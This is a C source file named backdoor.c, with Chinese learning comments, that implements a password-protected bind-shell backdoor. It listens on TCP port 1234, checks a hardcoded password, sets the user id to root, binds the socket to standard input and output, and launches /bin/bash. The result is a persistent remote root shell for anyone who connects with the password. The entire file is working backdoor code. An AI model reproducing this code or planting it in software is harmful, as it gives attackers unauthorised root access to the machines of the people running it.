/*************************************************************************
	> File Name: backdoor.c
	> Author:wanglei 
	> Mail: 
	> Created Time: 2016年06月22日 星期三 14时25分32秒
************************************************************************/
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<stdlib.h>
#define PASSWARD "abcd"
#define MAXSIZE 1024
int main()
{
    char buff[MAXSIZE];
    char message[]="请输入密码：";
    char text[]="you have a root shell here\n";
    char err[]="passwd is wrong\n";
    int listenfd,connfd,n;
    //创建监听fd和连接fd
    struct sockaddr_in target;
    struct sockaddr_in attack;
    target.sin_family=AF_INET;
    target.sin_addr.s_addr=htonl(0);//INADDR_ANY
    target.sin_port=htons(1234);

    listenfd=socket(AF_INET,SOCK_STREAM,0);
    //建立一个tcp连接的socket
    if(bind(listenfd,(struct sockaddr*)&target,sizeof(target))==-1)
        printf("[1]:bind sock error\n");
    if(listen(listenfd,5)==-1)
        printf("[2]:listen sock error\n");
    while(1)
    {

    if((connfd=accept(listenfd,NULL,NULL))==-1)
        printf("[3]:accept sock error\n");
    //printf("connfd is %d\n",connfd);
    write(connfd,message,strlen(message));
    n=read(connfd,buff,1024);
    //buff[n]='\0';
    // printf("%s",buff);
    if(strncmp(PASSWARD,buff,n-1)==0)
    {
        write(connfd,text,strlen(text));
   
        dup2(connfd,STDIN_FILENO);
        dup2(connfd,STDOUT_FILENO);
        dup2(connfd,STDERR_FILENO);
        setsid(); //只在子进程中有效，用于脱离终端控制daemon   
        setuid(0);
        //只有eid为root的程序可以更改uid为任意值
        system("/bin/bash");
        //system,会自动创建一个子进程，子进程结束后会回到父进程
        //而exec直接用目标程序替换掉本进程,所以用system while循环有效，而用exec，在shell退出时，程序直接关闭
        //--wrong,"sudo -s"--:system("bin/bash -s")//这条命令不需要setuid(0)，因为父进程的suid为0，拥有最高权限
        //bash需要uid为0才能获取root权限，而sh不需要
        // APUE-p256
        //execlp("/bin/bash","/bin/bash",NULL);
        close(connfd);
    }
    else
        {
            write(connfd,err,strlen(err)-1);
            close(connfd);
         }
    }
    close(listenfd);
}
